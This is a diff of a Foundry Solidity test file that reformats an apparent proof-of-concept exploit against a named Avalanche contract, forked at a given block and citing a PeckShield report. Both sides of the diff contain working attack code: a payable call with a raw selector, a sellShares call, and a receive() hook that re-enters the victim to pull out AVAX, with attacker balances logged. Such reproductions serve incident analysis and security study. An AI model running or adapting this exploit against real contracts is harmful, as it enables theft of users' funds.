@@ -16,60 +16,32 @@ import "./interface.sol";
 // https://twitter.com/peckshield/status/1710555944269292009
 
 contract ContractTest is Test {
-    address private constant victimContract =
-        0xA481B139a1A654cA19d2074F174f17D7534e8CeC;
+    address private constant victimContract = 0xA481B139a1A654cA19d2074F174f17D7534e8CeC;
     bool private reenter = true;
 
     function setUp() public {
-        vm.createSelectFork("Avalanche", 36136405);
+        vm.createSelectFork("Avalanche", 36_136_405);
     }
 
     function testExploit() public {
         deal(address(this), 1 ether);
 
-        emit log_named_decimal_uint(
-            "Attacker AVAX balance before exploit",
-            address(this).balance,
-            18
-        );
+        emit log_named_decimal_uint("Attacker AVAX balance before exploit", address(this).balance, 18);
 
-        (bool success, ) = victimContract.call{value: 1 ether}(
-            abi.encodeWithSelector(
-                bytes4(0xe9ccf3a3),
-                address(this),
-                true,
-                address(this)
-            )
+        (bool success,) = victimContract.call{value: 1 ether}(
+            abi.encodeWithSelector(bytes4(0xe9ccf3a3), address(this), true, address(this))
         );
         require(success, "Call to function with selector 0xe9ccf3a3 fail");
 
-        (bool success2, ) = victimContract.call(
-            abi.encodeWithSignature(
-                "sellShares(address,uint256)",
-                address(this),
-                1
-            )
-        );
+        (bool success2,) = victimContract.call(abi.encodeWithSignature("sellShares(address,uint256)", address(this), 1));
         require(success2, "Call to sellShares() fail");
 
-        emit log_named_decimal_uint(
-            "Attacker AVAX balance after exploit",
-            address(this).balance,
-            18
-        );
+        emit log_named_decimal_uint("Attacker AVAX balance after exploit", address(this).balance, 18);
     }
 
     receive() external payable {
         if (reenter == true) {
-            (bool success, ) = victimContract.call(
-                abi.encodeWithSelector(
-                    bytes4(0x5632b2e4),
-                    91e9,
-                    91e9,
-                    91e9,
-                    91e9
-                )
-            );
+            (bool success,) = victimContract.call(abi.encodeWithSelector(bytes4(0x5632b2e4), 91e9, 91e9, 91e9, 91e9));
             require(success, "Call to function with selector 0x5632b2e4 fail");
             reenter = false;
         }
